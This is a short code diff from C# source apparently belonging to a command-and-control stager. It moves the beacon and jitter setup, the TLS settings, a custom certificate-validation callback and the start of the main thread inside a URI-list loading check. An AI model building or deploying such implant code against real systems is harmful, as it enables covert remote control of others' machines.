@@ -31,13 +31,13 @@ namespace Stager
             {
                 if (LoadUriList(uriFile) > 0)
                     uriIsLoaded = true;
-            }
-            this.beacon = beacon;
-            this.jitter = jitter;
-            System.Net.ServicePointManager.SecurityProtocol = System.Net.SecurityProtocolType.Tls12 | System.Net.SecurityProtocolType.Tls11;
-            System.Net.ServicePointManager.ServerCertificateValidationCallback = ValidateServerCertificate;
-            mainThread = new Thread(new ThreadStart(Run));
-            mainThread.Start();
+                this.beacon = beacon;
+                this.jitter = jitter;
+                System.Net.ServicePointManager.SecurityProtocol = System.Net.SecurityProtocolType.Tls12 | System.Net.SecurityProtocolType.Tls11;
+                System.Net.ServicePointManager.ServerCertificateValidationCallback = ValidateServerCertificate;
+                mainThread = new Thread(new ThreadStart(Run));
+                mainThread.Start();
+            }  
         }
         /// <summary>
         /// This method adds a Uri to the list of Uri's to reach out to for finding commands
